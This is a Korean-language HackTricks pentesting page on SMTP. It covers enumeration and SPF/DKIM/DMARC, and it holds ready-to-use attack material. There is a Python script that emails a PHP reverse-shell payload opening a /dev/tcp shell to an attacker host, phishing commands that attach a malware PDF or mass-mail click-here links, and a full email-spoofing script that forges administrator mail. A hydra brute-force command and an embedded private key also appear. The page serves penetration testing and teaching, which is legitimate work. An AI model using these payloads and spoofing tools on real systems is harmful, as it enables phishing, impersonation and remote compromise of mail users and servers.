# 25,465,587 - Pentesting SMTP/s

{{#include ../../banners/hacktricks-training.md}}

<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**웹 앱, 네트워크 및 클라우드에 대한 해커의 관점을 얻으세요**

**실제 비즈니스에 영향을 미치는 중요한 취약점을 찾아보고 보고하세요.** 공격 표면을 매핑하고 권한 상승을 허용하는 보안 문제를 찾아내며, 자동화된 익스플로잇을 사용하여 필수 증거를 수집하여 귀하의 노력을 설득력 있는 보고서로 전환하는 20개 이상의 맞춤형 도구를 사용하세요.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## **기본 정보**

**간단한 메일 전송 프로토콜 (SMTP)**는 **이메일을 전송하고 수신하는** 데 사용되는 TCP/IP 스위트 내의 프로토콜입니다. 수신자의 끝에서 메시지를 대기열에 넣는 데 한계가 있기 때문에, SMTP는 종종 **POP3 또는 IMAP**과 함께 사용됩니다. 이러한 추가 프로토콜은 사용자가 서버 메일박스에 메시지를 저장하고 주기적으로 다운로드할 수 있도록 합니다.

실제로 **이메일 프로그램**은 **이메일 전송을 위해 SMTP를 사용**하고, **수신을 위해 POP3 또는 IMAP을 사용**하는 것이 일반적입니다. 유닉스 기반 시스템에서는 **sendmail**이 이메일 용도로 가장 자주 사용되는 SMTP 서버로 두드러집니다. Sendmail로 알려진 상용 패키지는 POP3 서버를 포함합니다. 또한, **Microsoft Exchange**는 SMTP 서버를 제공하며 POP3 지원을 포함할 수 있는 옵션을 제공합니다.

**기본 포트:** 25,465(ssl),587(ssl)
```
PORT   STATE SERVICE REASON  VERSION
25/tcp open  smtp    syn-ack Microsoft ESMTP 6.0.3790.3959
```
### EMAIL Headers

희망적으로 **희생자가 이메일을 보내도록 할 수 있는 기회가 있다면** (예: 웹 페이지의 연락처 양식을 통해), 그렇게 하세요. **이메일 헤더를 통해 희생자의 내부 토폴로지에 대해 알 수 있습니다.**

또한 **존재하지 않는 주소로 이메일을 보내기 위해 SMTP 서버에서 이메일을 받을 수 있습니다** (서버가 공격자에게 NDN 메일을 보낼 것이기 때문입니다). 하지만, 허용된 주소에서 이메일을 보내고 (SPF 정책을 확인하세요) NDN 메시지를 받을 수 있는지 확인해야 합니다.

또한 **다양한 내용을 보내보세요. 헤더에서 더 흥미로운 정보를 찾을 수 있습니다**: `X-Virus-Scanned: by av.domain.com`\
EICAR 테스트 파일을 보내야 합니다.\
**AV**를 감지하면 **알려진 취약점을 악용할 수 있습니다.**

## Basic actions

### **Banner Grabbing/Basic connection**

**SMTP:**
```bash
nc -vn <IP> 25
```
**SMTPS**:
```bash
openssl s_client -crlf -connect smtp.mailgun.org:465 #SSL/TLS without starttls command
openssl s_client -starttls smtp -crlf -connect smtp.mailgun.org:587
```
### 조직의 MX 서버 찾기
```bash
dig +short mx google.com
```
### 열거
```bash
nmap -p25 --script smtp-commands 10.10.10.10
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### NTLM Auth - 정보 유출

서버가 NTLM 인증(Windows)을 지원하는 경우, 민감한 정보(버전)를 얻을 수 있습니다. 더 많은 정보는 [**여기**](https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666)에서 확인하세요.
```bash
root@kali: telnet example.com 587
220 example.com SMTP Server Banner
>> HELO
250 example.com Hello [x.x.x.x]
>> AUTH NTLM 334
NTLM supported
>> TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=
334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA
```
또는 **nmap** 플러그인 `smtp-ntlm-info.nse`로 이를 **자동화**합니다.

### 내부 서버 이름 - 정보 유출

일부 SMTP 서버는 "MAIL FROM" 명령이 전체 주소 없이 발행될 때 발신자의 주소를 자동 완성하여 내부 이름을 유출합니다:
```
220 somedomain.com Microsoft ESMTP MAIL Service, Version: Y.Y.Y.Y ready at  Wed, 15 Sep 2021 12:13:28 +0200
EHLO all
250-somedomain.com Hello [x.x.x.x]
250-TURN
250-SIZE 52428800
250-ETRN
250-PIPELINING
250-DSN
250-ENHANCEDSTATUSCODES
250-8bitmime
250-BINARYMIME
250-CHUNKING
250-VRFY
250 OK
MAIL FROM: me
250 2.1.0 me@PRODSERV01.somedomain.com....Sender OK
```
### 스니핑

포트 25로 전송된 패킷에서 비밀번호를 스니핑하는지 확인하세요.

### [인증 브루트포스](../../generic-hacking/brute-force.md#smtp)

## 사용자 이름 브루트포스 열거

**인증이 항상 필요하지는 않습니다.**

### RCPT TO
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
MAIL FROM:example@domain.com
250 2.1.0 example@domain.com... Sender ok
RCPT TO:test
550 5.1.1 test... User unknown
RCPT TO:admin
550 5.1.1 admin... User unknown
RCPT TO:ed
250 2.1.5 ed... Recipient ok
```
### VRFY
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
250 myhost Hello 18.28.38.48, pleased to meet you
VRFY root
250 Super-User root@myhost
VRFY blah
550 blah... User unknown
```
### EXPN
```bash
$ telnet 1.1.1.1 25
Trying 1.1.1.1...
Connected to 1.1.1.1.
Escape character is '^]'.
220 myhost ESMTP Sendmail 8.9.3
HELO
501 HELO requires domain address
HELO x
EXPN test
550 5.1.1 test... User unknown
EXPN root
250 2.1.5 ed.williams@myhost
EXPN sshd
250 2.1.5 sshd privsep sshd@myhost
```
### 자동 도구
```
Metasploit: auxiliary/scanner/smtp/smtp_enum
smtp-user-enum: smtp-user-enum -M <MODE> -u <USER> -t <IP>
Nmap: nmap --script smtp-enum-users <IP>
```
<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**웹 앱, 네트워크 및 클라우드에 대한 해커의 관점을 얻으세요**

**실제 비즈니스에 영향을 미치는 중요한, 악용 가능한 취약점을 찾아보고 보고하세요.** 공격 표면을 매핑하고 권한 상승을 허용하는 보안 문제를 찾아내며, 필수 증거를 수집하기 위해 자동화된 익스플로잇을 사용하여 여러분의 노력을 설득력 있는 보고서로 전환하는 20개 이상의 맞춤형 도구를 사용하세요.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

## DSN 보고서

**전달 상태 알림 보고서**: 조직에 **잘못된 주소**로 **이메일**을 보내면, 해당 조직은 주소가 잘못되었다는 것을 **메일을 통해 다시 알려줍니다**. 반환된 이메일의 **헤더**에는 **민감한 정보**(보고서와 상호작용한 메일 서비스의 IP 주소나 안티바이러스 소프트웨어 정보 등)가 포함될 수 있습니다.

## [명령어](smtp-commands.md)

### 리눅스 콘솔에서 이메일 보내기
```bash
sendEmail -t to@domain.com -f from@attacker.com -s <ip smtp> -u "Important subject" -a /tmp/malware.pdf
Reading message body from STDIN because the '-m' option was not used.
If you are manually typing in a message:
- First line must be received within 60 seconds.
- End manual input with a CTRL-D on its own line.

<phishing message>
```

```bash
swaks --to $(cat emails | tr '\n' ',' | less) --from test@sneakymailer.htb --header "Subject: test" --body "please click here http://10.10.14.42/" --server 10.10.10.197
```
### Python으로 이메일 보내기

<details>

<summary>여기에 Python 코드</summary>
```python
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import smtplib
import sys

lhost = "127.0.0.1"
lport = 443
rhost = "192.168.1.1"
rport = 25 # 489,587

# create message object instance
msg = MIMEMultipart()

# setup the parameters of the message
password = ""
msg['From'] = "attacker@local"
msg['To'] = "victim@local"
msg['Subject'] = "This is not a drill!"

# payload
message = ("<?php system('bash -i >& /dev/tcp/%s/%d 0>&1'); ?>" % (lhost,lport))

print("[*] Payload is generated : %s" % message)

msg.attach(MIMEText(message, 'plain'))
server = smtplib.SMTP(host=rhost,port=rport)

if server.noop()[0] != 250:
print("[-]Connection Error")
exit()

server.starttls()

# Uncomment if log-in with authencation
# server.login(msg['From'], password)

server.sendmail(msg['From'], msg['To'], msg.as_string())
server.quit()

print("[***]successfully sent email to %s:" % (msg['To']))
```
</details>

## SMTP 스머글링

SMTP 스머글링 취약점은 모든 SMTP 보호를 우회할 수 있게 해줍니다 (보호에 대한 자세한 내용은 다음 섹션을 참조하세요). SMTP 스머글링에 대한 더 많은 정보는 다음을 확인하세요:

{{#ref}}
smtp-smuggling.md
{{#endref}}

## 메일 스푸핑 대응책

조직은 SMTP 메시지를 스푸핑하는 것이 용이하기 때문에 **SPF**, **DKIM**, **DMARC**를 사용하여 그들의 이름으로 무단 이메일이 전송되는 것을 방지합니다.

**이 대응책에 대한 완전한 가이드**는 [https://seanthegeek.net/459/demystifying-dmarc/](https://seanthegeek.net/459/demystifying-dmarc/)에서 제공됩니다.

### SPF

> [!CAUTION]
> SPF [는 2014년에 "사용 중지"되었습니다](https://aws.amazon.com/premiumsupport/knowledge-center/route53-spf-record/). 이는 `_spf.domain.com`에 **TXT 레코드**를 생성하는 대신 `domain.com`에 **동일한 구문**을 사용하여 생성해야 함을 의미합니다.\
> 또한, 이전 SPF 레코드를 재사용하기 위해 `"v=spf1 include:_spf.google.com ~all"`과 같은 것을 찾는 것이 일반적입니다.

**발신자 정책 프레임워크**(SPF)는 메일 전송 에이전트(MTA)가 이메일을 전송하는 호스트가 조직에서 정의한 승인된 메일 서버 목록을 조회하여 인증되었는지 확인할 수 있게 해주는 메커니즘입니다. 이 목록은 **도메인 이름을 대신하여 이메일을 전송할 수 있는** IP 주소/범위, 도메인 및 기타 엔티티를 지정하며, SPF 레코드에 다양한 "**메커니즘**"을 포함합니다.

#### 메커니즘

[위키백과](https://en.wikipedia.org/wiki/Sender_Policy_Framework)에서:

| 메커니즘 | 설명                                                                                                                                                                                                                                                                                                                         |
| --------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| ALL       | 항상 일치; 이전 메커니즘에 의해 일치하지 않는 모든 IP에 대해 `-all`과 같은 기본 결과에 사용됩니다.                                                                                                                                                                                                                                  |
| A         | 도메인 이름에 발신자의 주소로 확인할 수 있는 주소 레코드(A 또는 AAAA)가 있는 경우 일치합니다.                                                                                                                                                                                                                   |
| IP4       | 발신자가 주어진 IPv4 주소 범위에 있는 경우 일치합니다.                                                                                                                                                                                                                                                                              |
| IP6       | 발신자가 주어진 IPv6 주소 범위에 있는 경우 일치합니다.                                                                                                                                                                                                                                                                              |
| MX        | 도메인 이름에 발신자의 주소로 확인되는 MX 레코드가 있는 경우 일치합니다 (즉, 메일이 도메인의 수신 메일 서버 중 하나에서 옵니다).                                                                                                                                                                          |
| PTR       | 클라이언트 주소에 대한 도메인 이름(PTR 레코드)이 주어진 도메인에 있고 해당 도메인 이름이 클라이언트 주소로 확인되는 경우 (정방향 확인된 역 DNS), 일치합니다. 이 메커니즘은 권장되지 않으며 가능하면 피해야 합니다.                                                                                     |
| EXISTS    | 주어진 도메인 이름이 어떤 주소로도 확인되는 경우 일치합니다 (확인되는 주소에 관계없이). 이는 드물게 사용됩니다. SPF 매크로 언어와 함께 DNSBL 쿼리와 같은 더 복잡한 일치를 제공합니다.                                                                                                                           |
| INCLUDE   | 다른 도메인의 정책을 참조합니다. 해당 도메인의 정책이 통과하면 이 메커니즘도 통과합니다. 그러나 포함된 정책이 실패하면 처리는 계속됩니다. 다른 도메인의 정책에 완전히 위임하려면 리디렉션 확장을 사용해야 합니다.                                                                                     |
| REDIRECT  | <p>리디렉션은 SPF 정책을 호스팅하는 다른 도메인 이름에 대한 포인터로, 여러 도메인이 동일한 SPF 정책을 공유할 수 있게 해줍니다. 이는 동일한 이메일 인프라를 공유하는 많은 도메인과 작업할 때 유용합니다.</p><p>리디렉션 메커니즘에 표시된 도메인의 SPF 정책이 사용됩니다.</p> |

**정량자**를 식별하는 것도 가능합니다. 이는 **메커니즘이 일치할 경우 수행해야 할 작업**을 나타냅니다. 기본적으로 **정량자 "+"**가 사용됩니다 (따라서 어떤 메커니즘이 일치하면 허용된다는 의미입니다).\
보통 **각 SPF 정책의 끝**에 **\~all** 또는 **-all**과 같은 것이 표시됩니다. 이는 **발신자가 어떤 SPF 정책과도 일치하지 않을 경우 이메일을 신뢰할 수 없는 것으로 태그(\~)하거나 이메일을 거부(-)해야 함을 나타냅니다.**

#### 정량자

정책 내의 각 메커니즘은 의도된 결과를 정의하기 위해 네 가지 정량자 중 하나로 접두어를 붙일 수 있습니다:

- **`+`**: PASS 결과에 해당합니다. 기본적으로 메커니즘은 이 정량자를 가정하므로 `+mx`는 `mx`와 동일합니다.
- **`?`**: NEUTRAL 결과를 나타내며, NONE(특정 정책 없음)과 유사하게 처리됩니다.
- **`~`**: SOFTFAIL을 나타내며, NEUTRAL과 FAIL 사이의 중간 지점으로 작용합니다. 이 결과를 충족하는 이메일은 일반적으로 수락되지만 적절히 표시됩니다.
- **`-`**: FAIL을 나타내며, 이메일이 즉시 거부되어야 함을 제안합니다.

다음 예제에서는 **google.com의 SPF 정책**이 설명됩니다. 첫 번째 SPF 정책 내에서 다른 도메인의 SPF 정책이 포함된 것을 주목하세요:
```shell-session
dig txt google.com | grep spf
google.com.             235     IN      TXT     "v=spf1 include:_spf.google.com ~all"

dig txt _spf.google.com | grep spf
; <<>> DiG 9.11.3-1ubuntu1.7-Ubuntu <<>> txt _spf.google.com
;_spf.google.com.               IN      TXT
_spf.google.com.        235     IN      TXT     "v=spf1 include:_netblocks.google.com include:_netblocks2.google.com include:_netblocks3.google.com ~all"

dig txt _netblocks.google.com | grep spf
_netblocks.google.com.  1606    IN      TXT     "v=spf1 ip4:35.190.247.0/24 ip4:64.233.160.0/19 ip4:66.102.0.0/20 ip4:66.249.80.0/20 ip4:72.14.192.0/18 ip4:74.125.0.0/16 ip4:108.177.8.0/21 ip4:173.194.0.0/16 ip4:209.85.128.0/17 ip4:216.58.192.0/19 ip4:216.239.32.0/19 ~all"

dig txt _netblocks2.google.com | grep spf
_netblocks2.google.com. 1908    IN      TXT     "v=spf1 ip6:2001:4860:4000::/36 ip6:2404:6800:4000::/36 ip6:2607:f8b0:4000::/36 ip6:2800:3f0:4000::/36 ip6:2a00:1450:4000::/36 ip6:2c0f:fb50:4000::/36 ~all"

dig txt _netblocks3.google.com | grep spf
_netblocks3.google.com. 1903    IN      TXT     "v=spf1 ip4:172.217.0.0/19 ip4:172.217.32.0/20 ip4:172.217.128.0/19 ip4:172.217.160.0/20 ip4:172.217.192.0/19 ip4:172.253.56.0/21 ip4:172.253.112.0/20 ip4:108.177.96.0/19 ip4:35.191.0.0/16 ip4:130.211.0.0/22 ~all"
```
전통적으로 올바른/아무 SPF 레코드가 없는 도메인 이름을 스푸핑하는 것이 가능했습니다. **현재**는 **유효한 SPF 레코드가 없는 도메인**에서 오는 **이메일**이 **자동으로 거부되거나 신뢰할 수 없는 것으로 표시될 가능성이 높습니다**.

도메인의 SPF를 확인하려면 다음과 같은 온라인 도구를 사용할 수 있습니다: [https://www.kitterman.com/spf/validate.html](https://www.kitterman.com/spf/validate.html)

### DKIM (DomainKeys Identified Mail)

DKIM은 아웃바운드 이메일에 서명하는 데 사용되며, 외부 메일 전송 에이전트(MTA)가 DNS에서 도메인의 공개 키를 검색하여 이를 검증할 수 있도록 합니다. 이 공개 키는 도메인의 TXT 레코드에 위치합니다. 이 키에 접근하려면 선택자와 도메인 이름을 모두 알아야 합니다.

예를 들어, 키를 요청하려면 도메인 이름과 선택자가 필수적입니다. 이는 메일 헤더 `DKIM-Signature`에서 찾을 수 있습니다, 예: `d=gmail.com;s=20120113`.

이 정보를 가져오는 명령은 다음과 같을 수 있습니다:
```bash
dig 20120113._domainkey.gmail.com TXT | grep p=
# This command would return something like:
20120113._domainkey.gmail.com. 280 IN   TXT    "k=rsa\; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1Kd87/UeJjenpabgbFwh+eBCsSTrqmwIYYvywlbhbqoo2DymndFkbjOVIPIldNs/m40KF+yzMn1skyoxcTUGCQs8g3
```
### DMARC (Domain-based Message Authentication, Reporting & Conformance)

DMARC는 SPF 및 DKIM 프로토콜을 기반으로 이메일 보안을 강화합니다. 특정 도메인에서 오는 이메일을 처리하는 데 있어 메일 서버가 따라야 할 정책을 설명하며, 인증 실패를 처리하는 방법과 이메일 처리 작업에 대한 보고서를 어디로 보낼지를 포함합니다.

**DMARC 레코드를 얻으려면 서브도메인 \_dmarc를 쿼리해야 합니다.**
```bash
# Reject
dig _dmarc.facebook.com txt | grep DMARC
_dmarc.facebook.com.	3600	IN	TXT	"v=DMARC1; p=reject; rua=mailto:a@dmarc.facebookmail.com; ruf=mailto:fb-dmarc@datafeeds.phishlabs.com; pct=100"

# Quarantine
dig _dmarc.google.com txt | grep DMARC
_dmarc.google.com.	300	IN	TXT	"v=DMARC1; p=quarantine; rua=mailto:mailauth-reports@google.com"

# None
dig _dmarc.bing.com txt | grep DMARC
_dmarc.bing.com.	3600	IN	TXT	"v=DMARC1; p=none; pct=100; rua=mailto:BingEmailDMARC@microsoft.com;"
```
#### DMARC 태그

| 태그 이름 | 목적                                         | 샘플                             |
| -------- | --------------------------------------------- | ------------------------------- |
| v        | 프로토콜 버전                                | v=DMARC1                        |
| pct      | 필터링에 적용되는 메시지의 비율             | pct=20                          |
| ruf      | 포렌식 보고서용 보고 URI                    | ruf=mailto:authfail@example.com |
| rua      | 집계 보고서의 보고 URI                      | rua=mailto:aggrep@example.com   |
| p        | 조직 도메인에 대한 정책                     | p=quarantine                    |
| sp       | OD의 하위 도메인에 대한 정책                | sp=reject                       |
| adkim    | DKIM에 대한 정렬 모드                       | adkim=s                         |
| aspf     | SPF에 대한 정렬 모드                        | aspf=r                          |

### **하위 도메인은 어떻게 되나요?**

**여기서** [**보세요**](https://serverfault.com/questions/322949/do-spf-records-for-primary-domain-apply-to-subdomains)**.**\
메일을 보내고자 하는 각 하위 도메인에 대해 별도의 SPF 레코드가 필요합니다.\
다음 내용은 원래 openspf.org에 게시된 것으로, 이와 같은 것에 대한 훌륭한 리소스였습니다.

> 데몬 질문: 하위 도메인은 어떻게 되나요?
>
> pielovers.demon.co.uk에서 메일을 받고, pielovers에 대한 SPF 데이터가 없다면, 한 단계 올라가서 demon.co.uk에 대한 SPF를 테스트해야 할까요? 아니요. 데몬의 각 하위 도메인은 다른 고객이며, 각 고객은 자신의 정책을 가질 수 있습니다. 데몬의 정책이 기본적으로 모든 고객에게 적용되는 것은 의미가 없습니다; 데몬이 그렇게 하기를 원한다면, 각 하위 도메인에 대한 SPF 레코드를 설정할 수 있습니다.
>
> 따라서 SPF 발행자에게 주는 조언은 다음과 같습니다: A 또는 MX 레코드가 있는 각 하위 도메인 또는 호스트 이름에 대해 SPF 레코드를 추가해야 합니다.
>
> 와일드카드 A 또는 MX 레코드가 있는 사이트는 다음 형식의 와일드카드 SPF 레코드도 가져야 합니다: \* IN TXT "v=spf1 -all"

이것은 의미가 있습니다 - 하위 도메인은 매우 다른 지리적 위치에 있을 수 있으며 매우 다른 SPF 정의를 가질 수 있습니다.

### **오픈 릴레이**

이메일이 전송될 때, 스팸으로 표시되지 않도록 하는 것이 중요합니다. 이는 종종 **수신자가 신뢰하는 릴레이 서버**를 사용하여 달성됩니다. 그러나 일반적인 문제는 관리자가 **허용할 안전한 IP 범위**에 대해 완전히 인식하지 못할 수 있다는 것입니다. 이러한 이해 부족은 SMTP 서버 설정에서 실수로 이어질 수 있으며, 이는 보안 평가에서 자주 식별되는 위험입니다.

특히 잠재적이거나 진행 중인 클라이언트와의 통신과 관련하여 이메일 배달 문제를 피하기 위해 일부 관리자가 사용하는 우회 방법은 **모든 IP 주소에서의 연결을 허용하는 것**입니다. 이는 아래와 같이 SMTP 서버의 `mynetworks` 매개변수를 모든 IP 주소를 수용하도록 구성하여 수행됩니다:
```bash
mynetworks = 0.0.0.0/0
```
메일 서버가 오픈 릴레이인지 확인하기 위해 (즉, 외부 소스에서 이메일을 전달할 수 있는지 확인하기 위해) `nmap` 도구가 일반적으로 사용됩니다. 이 도구에는 이를 테스트하기 위해 설계된 특정 스크립트가 포함되어 있습니다. `nmap`을 사용하여 포트 25에서 서버(예: IP 10.10.10.10)에 대해 자세한 스캔을 수행하는 명령은 다음과 같습니다:
```bash
nmap -p25 --script smtp-open-relay 10.10.10.10 -v
```
### **도구**

- [**https://github.com/serain/mailspoof**](https://github.com/serain/mailspoof) **SPF 및 DMARC 잘못 구성 확인**
- [**https://pypi.org/project/checkdmarc/**](https://pypi.org/project/checkdmarc/) **SPF 및 DMARC 구성 자동 가져오기**

### 스푸핑 이메일 보내기

- [**https://www.mailsploit.com/index**](https://www.mailsploit.com/index)
- [**http://www.anonymailer.net/**](http://www.anonymailer.net)
- [**https://emkei.cz/**](https://emkei.cz/)

**또는 도구를 사용할 수 있습니다:**

- [**https://github.com/magichk/magicspoofing**](https://github.com/magichk/magicspoofing)
```bash
# This will send a test email from test@victim.com to destination@gmail.com
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com
# But you can also modify more options of the email
python3 magicspoofmail.py -d victim.com -t -e destination@gmail.com --subject TEST --sender administrator@victim.com
```
> [!WARNING]
> 만약 **dkim python lib**에서 키를 파싱하는 데 오류가 발생하면, 다음의 것을 사용해도 괜찮습니다.\
> **NOTE**: 이것은 openssl 개인 키가 **dkim**에 의해 파싱될 수 없는 경우에 빠른 검사를 위한 더러운 수정입니다.
>
> ```
> -----BEGIN RSA PRIVATE KEY-----
> MIICXgIBAAKBgQDdkohAIWT6mXiHpfAHF8bv2vHTDboN2dl5pZKG5ZSHCYC5Z1bt
> spr6chlrPUX71hfSkk8WxnJ1iC9Moa9sRzdjBrxPMjRDgP8p8AFdpugP5rJJXExO
> pkZcdNPvCXGYNYD86Gpous6ubn6KhUWwDD1bw2UFu53nW/AK/EE4/jeraQIDAQAB
> AoGAe31lrsht7TWH9aJISsu3torCaKyn23xlNuVO6xwdUb28Hpk327bFpXveKuS1
> koxaLqQYrEriFBtYsU8T5Dc06FQAVLpUBOn+9PcKlxPBCLvUF+/KbfHF0q1QbeZR
> fgr+E+fPxwVPxxk3i1AwCP4Cp1+bz2s58wZXlDBkWZ2YJwECQQD/f4bO2lnJz9Mq
> 1xsL3PqHlzIKh+W+yiGmQAELbgOdX4uCxMxjs5lwGSACMH2nUwXx+05RB8EM2m+j
> ZBTeqxDxAkEA3gHyUtVenuTGClgYpiwefaTbGfYadh0z2KmiVcRqWzz3hDUEWxhc
> GNtFT8wzLcmRHB4SQYUaS0Df9mpvwvdB+QJBALGv9Qci39L0j/15P7wOYMWvpwOf
> 422+kYxXcuKKDkWCTzoQt7yXCRzmvFYJdznJCZdymNLNu7q+p2lQjxsUiWECQQCI
> Ms2FP91ywYs1oWJN39c84byBKtiFCdla3Ib48y0EmFyJQTVQ5ZrqrOrSz8W+G2Do
> zRIKHCxLapt7w0SZabORAkEAxvm5pd2MNVqrqMJHbukHY1yBqwm5zVIYr75eiIDP
> K9B7U1w0CJFUk6+4Qutr2ROqKtNOff9KuNRLAOiAzH3ZbQ==
> -----END RSA PRIVATE KEY-----
> ```

**또는 수동으로 할 수도 있습니다:**

{{#tabs}}
{{#tab name="PHP"}}

<pre class="language-php"><code class="lang-php"><strong># 이것은 서명되지 않은 메시지를 보냅니다
</strong><strong>mail("your_email@gmail.com", "Test Subject!", "hey! This is a test", "From: administrator@victim.com");
</strong></code></pre>

{{#endtab}}

{{#tab name="Python"}}
```python
# Code from https://github.com/magichk/magicspoofing/blob/main/magicspoofmail.py

import os
import dkim #pip3 install dkimpy
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase

# Set params
destination="destination@gmail.com"
sender="administrator@victim.com"
subject="Test"
message_html="""
<html>
<body>
<h3>This is a test, not a scam</h3>
<br />
</body>
</html>
"""
sender_domain=sender.split("@")[1]

# Prepare postfix
os.system("sudo sed -ri 's/(myhostname) = (.*)/\\1 = "+sender_domain+"/g' /etc/postfix/main.cf")
os.system("systemctl restart postfix")

# Generate DKIM keys
dkim_private_key_path="dkimprivatekey.pem"
os.system(f"openssl genrsa -out {dkim_private_key_path} 1024 2> /dev/null")
with open(dkim_private_key_path) as fh:
dkim_private_key = fh.read()

# Generate email
msg = MIMEMultipart("alternative")
msg.attach(MIMEText(message_html, "html"))
msg["To"] = destination
msg["From"] = sender
msg["Subject"] = subject
headers = [b"To", b"From", b"Subject"]
msg_data = msg.as_bytes()

# Sign email with dkim
## The receiver won't be able to check it, but the email will appear as signed (and therefore, more trusted)
dkim_selector="s1"
sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
msg["DKIM-Signature"] = sig[len("DKIM-Signature: ") :].decode()
msg_data = msg.as_bytes()

# Use local postfix relay to send email
smtp="127.0.0.1"
s = smtplib.SMTP(smtp)
s.sendmail(sender, [destination], msg_data)
```
{{#endtab}}
{{#endtabs}}

### **더 많은 정보**

**이러한 보호 조치에 대한 더 많은 정보는** [**https://seanthegeek.net/459/demystifying-dmarc/**](https://seanthegeek.net/459/demystifying-dmarc/)

### **기타 피싱 지표**

- 도메인의 연령
- IP 주소를 가리키는 링크
- 링크 조작 기술
- 의심스러운 (비정상적인) 첨부파일
- 깨진 이메일 내용
- 메일 헤더와 다른 값 사용
- 유효하고 신뢰할 수 있는 SSL 인증서의 존재
- 웹 콘텐츠 필터링 사이트에 페이지 제출

## SMTP를 통한 데이터 유출

**SMTP를 통해 데이터를 보낼 수 있다면** [**이것을 읽어보세요**](../../generic-hacking/exfiltration.md#smtp)**.**

## 구성 파일

### Postfix

일반적으로 설치된 경우 `/etc/postfix/master.cf`에 **스크립트가 포함되어** 있으며, 예를 들어 사용자가 새 메일을 수신할 때 실행됩니다. 예를 들어 `flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}`라는 줄은 사용자가 mark인 경우 새 메일을 수신하면 `/etc/postfix/filtering`이 실행됨을 의미합니다.

기타 구성 파일:
```
sendmail.cf
submit.cf
```
## 참고 문헌

- [https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/](https://research.nccgroup.com/2015/06/10/username-enumeration-techniques-and-their-value/)
- [https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/](https://www.reddit.com/r/HowToHack/comments/101it4u/what_could_hacker_do_with_misconfigured_smtp/)

## HackTricks 자동 명령
```
Protocol_Name: SMTP    #Protocol Abbreviation if there is one.
Port_Number:  25,465,587     #Comma separated if there is more than one.
Protocol_Description: Simple Mail Transfer Protocol          #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMTP
Note: |
SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.

https://book.hacktricks.xyz/pentesting/pentesting-smtp

Entry_2:
Name: Banner Grab
Description: Grab SMTP Banner
Command: nc -vn {IP} 25

Entry_3:
Name: SMTP Vuln Scan
Description: SMTP Vuln Scan With Nmap
Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}

Entry_4:
Name: SMTP User Enum
Description: Enumerate uses with smtp-user-enum
Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}

Entry_5:
Name: SMTPS Connect
Description: Attempt to connect to SMTPS two different ways
Command: openssl s_client -crlf -connect {IP}:465 &&&& openssl s_client -starttls smtp -crlf -connect {IP}:587

Entry_6:
Name: Find MX Servers
Description: Find MX servers of an organization
Command: dig +short mx {Domain_Name}

Entry_7:
Name: Hydra Brute Force
Description: Need Nothing
Command: hydra -P {Big_Passwordlist} {IP} smtp -V

Entry_8:
Name: consolesless mfs enumeration
Description: SMTP enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' && msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit'

```
<figure><img src="../../images/pentest-tools.svg" alt=""><figcaption></figcaption></figure>

**웹 앱, 네트워크 및 클라우드에 대한 해커의 관점을 얻으세요**

**실제 비즈니스에 영향을 미치는 중요한, 악용 가능한 취약점을 찾아보고 보고하세요.** 공격 표면을 매핑하고 권한 상승을 허용하는 보안 문제를 찾아내며, 자동화된 익스플로잇을 사용하여 필수 증거를 수집하는 데 사용할 수 있는 20개 이상의 맞춤형 도구를 활용하세요. 여러분의 노력을 설득력 있는 보고서로 전환하세요.

{% embed url="https://pentest-tools.com/?utm_term=jul2024&utm_medium=link&utm_source=hacktricks&utm_campaign=spons" %}

{{#include ../../banners/hacktricks-training.md}}
